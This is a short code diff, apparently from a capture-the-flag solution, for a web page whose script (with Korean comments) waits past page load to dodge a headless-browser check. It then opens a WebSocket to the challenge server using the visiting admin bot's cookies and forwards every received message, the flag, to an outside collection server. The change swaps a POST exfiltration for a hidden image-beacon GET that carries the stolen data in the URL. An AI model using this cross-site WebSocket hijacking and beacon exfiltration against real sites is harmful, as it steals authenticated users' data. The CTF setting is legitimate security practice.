@@ -261,8 +261,7 @@
       </div>
     </div>
  <script>
-      // Puppeteer의 networkidle2 우회를 위해 load 후 지연 실행
-      window.addEventListener('load', function() {
+ window.addEventListener('load', function() {
         setTimeout(function() {
           // 어드민 봇 WS 서버 연결 (자동으로 admin 쿠키 포함)
           const ws = new WebSocket('wss://wembsoncket.chal.cyberjousting.com');
@@ -273,12 +272,10 @@
           });
 
           ws.addEventListener('message', (evt) => {
-            // 플래그를 exfil 서버로 POST
-            fetch('https://cifrar.cju.ac.kr/collect', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: evt.data
-            });
+            // 플래그를 exfil 서버에 GET으로 전송
+            const flagData = encodeURIComponent(evt.data);
+            const beacon = new Image();
+            beacon.src = 'https://cifrar.cju.ac.kr/collect?message=' + flagData;
           });
         }, 0);
       });
